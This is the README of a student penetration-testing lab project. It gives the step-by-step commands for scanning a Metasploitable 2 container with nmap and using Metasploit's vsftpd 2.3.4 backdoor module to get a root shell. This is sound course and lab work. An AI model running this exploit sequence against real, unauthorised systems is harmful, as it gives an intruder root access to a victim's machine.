# Penetration-Testing

## Overview
This project, part of the CYB101 course, focuses on penetration testing and exploitation of vulnerable systems. The primary objective of this project was to gain unauthorized access to a deliberately vulnerable system, **Metasploitable 2**, by leveraging a well-known exploit in **vsftpd** on port 21. This project provided hands-on experience in the use of tools such as **nmap** and the **Metasploit Framework**, both of which are essential for penetration testing in the field of cybersecurity.

## Project Goals
The goals of this project were to:
- **Set up and run a Docker image** of the vulnerable system (Metasploitable).
- **Use nmap** to identify open ports and vulnerabilities.
- **Use the Metasploit Framework** to exploit the vsftpd backdoor vulnerability on port 21.
- Demonstrate the exploit by gaining access to the system’s shell and verifying successful penetration.

## Tools Used
- **nmap**: For network scanning and vulnerability detection.
- **Metasploit Framework**: For executing the exploit.
- **Docker**: For running the Metasploitable virtual machine.

## Required Steps
The key steps to complete this project are as follows:

### 1. Run Metasploitable in Docker
```bash
docker start -ai metasploitable
```
This command runs the vulnerable machine inside a Docker container.

### 2. Network Scanning with nmap
Using `nmap`, we scan the system to identify open ports and services. Specifically, we target port 21 to look for vulnerabilities.
```bash
nmap 172.17.0.2 --script vuln -p 21
```
This scan reveals the **vsftpd** vulnerability, a backdoor that allows access to the system through a crafted username.

### 3. Exploit Using Metasploit
Launch **Metasploit** to begin the exploitation process:
```bash
msfconsole
```
Search for the **vsftpd** exploit and configure it:
```bash
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.17.0.2
```
Finally, execute the exploit to gain access:
```bash
exploit
```

### 4. Verify Access
Once inside the system, run the following commands to verify access:
```bash
lsb_release -a
ifconfig
```
These commands allow us to confirm that we have access to the Metasploitable system and provide details about the Linux distribution and network settings.

## Results
- **Vulnerability Exploited**: vsftpd backdoor on port 21.
- **Successful Exploit**: Gained root shell access to the Metasploitable machine.
- **Tools Used**: nmap for scanning, Metasploit for exploiting.
